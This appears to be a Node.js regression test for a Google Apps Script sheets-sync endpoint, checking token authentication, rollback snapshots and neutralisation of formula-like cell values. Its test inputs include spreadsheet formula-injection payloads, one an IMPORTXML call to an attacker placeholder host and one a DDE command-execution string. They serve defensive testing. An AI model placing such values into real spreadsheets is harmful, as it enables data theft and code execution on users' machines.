'use strict';

// Focused security regression tests for the Google Apps Script endpoint (including underscored Apps Script helper names).
const fs = require('node:fs');
const vm = require('node:vm');
const assert = require('node:assert/strict');

const source = fs.readFileSync('google-apps-script/VFORGE_Sheets_Sync.gs', 'utf8');
function extract(name) {
  const start = source.indexOf('function ' + name + '(');
  assert.notEqual(start, -1, name + ' must exist');
  const end = source.indexOf('\nfunction ', start + 10);
  return source.slice(start, end < 0 ? source.length : end).trimEnd();
}
let configuredToken = 'a'.repeat(48);
const context = {
  PropertiesService: {
    getScriptProperties: () => ({ getProperty: key => key === 'VFORGE_SYNC_TOKEN' ? configuredToken : null })
  }
};
vm.createContext(context);
vm.runInContext(['constantTimeEquals_', 'safeSheetValue_', 'requireSyncToken_'].map(extract).join('\n'), context);

assert.equal(context.constantTimeEquals_('secret', 'secret'), true);
assert.equal(context.constantTimeEquals_('secret', 'secreu'), false);
assert.equal(context.constantTimeEquals_('secret', 'secret-long'), false);

for (const input of ['=IMPORTXML("https://attacker.invalid","//x")', '   =1+1', '+cmd|/C calc', '-1+1', '@SUM(A1:A2)']) {
  assert.equal(context.safeSheetValue_(input), "'" + input, 'formula-like text must be neutralized');
}
assert.equal(context.safeSheetValue_('ordinary product'), 'ordinary product');
assert.equal(context.safeSheetValue_(-125.5), -125.5, 'numeric negatives remain numeric');

assert.throws(() => context.requireSyncToken_('wrong'), /Unauthorized/);
assert.doesNotThrow(() => context.requireSyncToken_(configuredToken));
configuredToken = '';
assert.throws(() => context.requireSyncToken_('anything'), /not configured securely/);

const doPostStart = source.indexOf('function doPost(e)');
const doPostEnd = source.indexOf('\nfunction storeReceipt_', doPostStart);
const doPostSource = source.slice(doPostStart, doPostEnd);
assert.ok(doPostSource.indexOf('requireSyncToken_(data.authToken)') > doPostSource.indexOf('validatePayload_(data)'),
  'POST must validate the payload before requiring the shared token and before spreadsheet writes');
assert.ok(doPostSource.indexOf('requireSyncToken_(data.authToken)') < doPostSource.indexOf('SpreadsheetApp.openById'),
  'unauthorized requests must be rejected before opening the spreadsheet');
assert.match(doPostSource, /if \(!authChecked\) return json_\(/,
  'unauthenticated requests must return without entering the failure-log spreadsheet path');
assert.ok(doPostSource.indexOf('snapshotReportSheets_(ss)') < doPostSource.indexOf('writeReport_(ss'),
  'all report tabs must be snapshotted before the first report write');
assert.match(doPostSource, /restoreReportSheets_\(ss, reportBackup\)/,
  'a failed report write or verification must trigger rollback');
assert.match(source, /function snapshotReportSheets_\(ss\)/,
  'report snapshot helper must exist');
assert.match(source, /function restoreReportSheets_\(ss, backup\)/,
  'report rollback helper must exist');

process.stdout.write('PASS Apps Script endpoint requires configured token before spreadsheet access\n');
process.stdout.write('PASS formula-like strings are neutralized while numeric values remain numeric\n');
